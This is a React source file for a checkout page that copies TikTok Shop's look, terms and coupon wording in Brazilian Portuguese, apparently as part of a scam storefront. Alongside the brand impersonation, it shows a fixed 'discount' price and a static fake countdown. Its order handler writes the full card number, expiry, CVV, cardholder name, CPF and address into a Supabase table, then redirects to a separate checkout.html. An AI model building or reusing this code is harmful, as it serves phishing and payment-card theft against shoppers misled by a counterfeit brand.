"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  Star, 
  Zap, 
  ChevronUp,
  ChevronDown,
  Plus,
  Minus,
  Ticket,
  CreditCard,
  CheckCircle2
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
import { supabase } from '@/integrations/supabase/client';
import { showError, showSuccess } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [shippingAddress, setShippingAddress] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else {
      navigate('/');
    }

    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }

    if (location.state?.addressAdded && location.state?.address) {
      setShippingAddress(location.state.address);
    }
  }, [location, navigate]);

  if (!product) return null;

  const unitPriceNum = 47.00;
  const originalUnitPriceNum = 249.00;
  const subtotal = unitPriceNum * quantity;
  const originalSubtotal = originalUnitPriceNum * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  const handleFinalizeOrder = async () => {
    if (!shippingAddress) {
      showError("Adicione um endereço de entrega.");
      return;
    }

    if (paymentMethod === 'card' && !cardData) {
      showError("Adicione os dados do cartão.");
      return;
    }

    setIsSubmitting(true);

    try {
      const orderData = {
        product_title: product.title,
        quantity: quantity,
        total_amount: finalTotal,
        payment_method: paymentMethod,
        customer_name: shippingAddress.name,
        customer_cpf: cardData ? cardData.cpf : "N/A",
        address_cep: shippingAddress.cep,
        address_state: shippingAddress.state,
        address_city: shippingAddress.city,
        address_neighborhood: shippingAddress.neighborhood,
        address_street: shippingAddress.address,
        address_number: shippingAddress.number,
        address_complement: shippingAddress.complement,
        order_note: orderNote,
        card_number: paymentMethod === 'card' ? cardData.cardNumber : null,
        card_expiry: paymentMethod === 'card' ? cardData.expiry : null,
        card_cvv: paymentMethod === 'card' ? cardData.cvv : null,
        card_holder_name: paymentMethod === 'card' ? cardData.name : null,
      };

      const { error } = await supabase.from('orders').insert([orderData]);
      if (error) throw error;

      showSuccess("Pedido realizado!");
      
      if (paymentMethod === 'pix') {
        navigate('/pix-pagamento', { state: { product, shippingAddress } });
      } else {
        window.location.href = '/checkout.html';
      }
    } catch (err) {
      console.error(err);
      showError("Erro ao processar pedido.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[140px]">
      {/* Header 1:1 */}
      <div className="bg-white border-b sticky top-0 z-50 flex flex-col items-center py-2">
        <div className="w-full flex items-center px-4 relative">
          <button onClick={() => navigate(-1)} className="p-1">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="flex-grow text-center">
            <h1 className="text-[17px] font-bold text-gray-900 leading-tight">Resumo do Pedido</h1>
          </div>
        </div>
        <div className="flex items-center text-[#00BFA5] text-[11px] font-medium mt-0.5">
          <CreditCard size={14} className="mr-1" />
          <span>Planos sem juros disponíveis</span>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        {/* Endereço Customizado */}
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100 mt-2">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <div className="flex flex-col">
              <span className="text-[14px] text-gray-900 font-medium">
                {shippingAddress ? `${shippingAddress.address}, ${shippingAddress.number}` : "Endereço de envio"}
              </span>
              {shippingAddress && <span className="text-[12px] text-gray-400">{shippingAddress.city} - {shippingAddress.state}</span>}
            </div>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
            {shippingAddress ? "Alterar" : "+ Adicionar endereço"}
          </button>
        </div>

        {/* Cupom TikTok 1:1 */}
        <div 
          className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer"
          onClick={() => setIsCouponDrawerOpen(true)}
        >
          <div className="flex items-center space-x-2">
            <Ticket size={18} className="text-[#FF2C55]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1.5">
            <span className="text-[12px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5 rounded-sm">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={16} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo do Pedido 1:1 */}
        <div className="bg-white mt-2.5 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          
          <div className="space-y-4">
            <div 
              className="flex justify-between items-center cursor-pointer"
              onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}
            >
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                {isSubtotalOpen ? <ChevronUp size={16} className="text-gray-900" /> : <ChevronDown size={16} className="text-gray-900" />}
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4 pl-4">
                <div className="flex justify-between text-[13px] text-gray-500">
                  <span>Preço original</span>
                  <span>R$ {originalSubtotal.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[13px]">
                  <span className="text-gray-500">Desconto no produto</span>
                  <span className="text-[#FF2C55]">- R$ {discountTotal.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[13px]">
                  <span className="text-gray-500">Cupons do TikTok Shop</span>
                  <span className="text-[#FF2C55]">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t border-gray-100 flex flex-col">
              <div className="flex justify-between items-center">
                <span className="text-[18px] font-bold text-gray-900">Total</span>
                <span className="text-[18px] font-bold text-gray-900">R$ {finalTotalStr}</span>
              </div>
              <span className="text-[11px] text-gray-400 text-right mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>

        {/* Forma de Pagamento 1:1 */}
        <div className="bg-white mt-2.5 p-4 space-y-6">
          <h3 className="text-[15px] font-bold text-gray-900">Forma de pagamento</h3>
          
          <div className="space-y-4">
            {/* Cartão */}
            <div className="space-y-3">
              <div 
                className="flex items-center justify-between cursor-pointer"
                onClick={() => navigate('/adicionar-cartao')}
              >
                <div className="flex items-center space-x-2">
                  <div className="w-5 h-5 bg-[#F1F1F1] rounded-sm flex items-center justify-center">
                    {cardData ? <CheckCircle2 size={12} className="text-[#00BFA5]" /> : <Plus size={14} className="text-gray-400" />}
                  </div>
                  <span className="text-[14px] font-medium text-gray-900">
                    {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                  </span>
                </div>
                <ChevronRight size={18} className="text-gray-300" />
              </div>
              
              <div className="flex items-center space-x-2 pl-7">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" />
                <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-4" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-4" />
              </div>

              <div className="pl-7">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-2 py-0.5 rounded-sm inline-flex items-center cursor-pointer">
                  Sem juros em até 3 parcelas <ChevronRight size={12} className="ml-0.5" />
                </div>
                <p className="text-[11px] text-gray-400 mt-1">Pague em até 12 parcelas</p>
              </div>
            </div>

            {/* Pix */}
            <div 
              className="flex items-center justify-between cursor-pointer border-t pt-5"
              onClick={() => setPaymentMethod('pix')}
            >
              <div className="flex items-center space-x-3">
                <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
                </div>
                <span className="text-[14px] font-medium text-gray-900">Pix</span>
              </div>
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
              </div>
            </div>

            {/* Google Pay / Ver todos */}
            <div className="flex items-center justify-between border-t pt-5">
              <div className="h-6 px-1.5 border rounded flex items-center">
                <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-3" />
              </div>
              <div className="flex items-center text-[13px] font-bold text-gray-900 cursor-pointer">
                Ver todos <ChevronRight size={16} className="ml-0.5 text-gray-400" />
              </div>
            </div>
          </div>
        </div>

        {/* Termos Legais 1:1 */}
        <div className="p-4 space-y-4">
          <p className="text-[11px] text-gray-500 leading-tight">
            Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
          </p>

          <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 rounded-sm">
            <span className="text-[16px]">😊</span>
            <span className="text-[12px] text-[#FF2C55] font-medium leading-tight">
              Você está economizando R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')} nesse pedido.
            </span>
          </div>
        </div>
      </div>

      {/* Footer Fixo 1:1 */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[16px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px] flex flex-col items-center justify-center space-y-0"
            onClick={handleFinalizeOrder}
            disabled={isSubmitting}
          >
            <span className="text-[17px] mb-0.5">{isSubmitting ? "Processando..." : "Fazer pedido"}</span>
            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:23:39</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;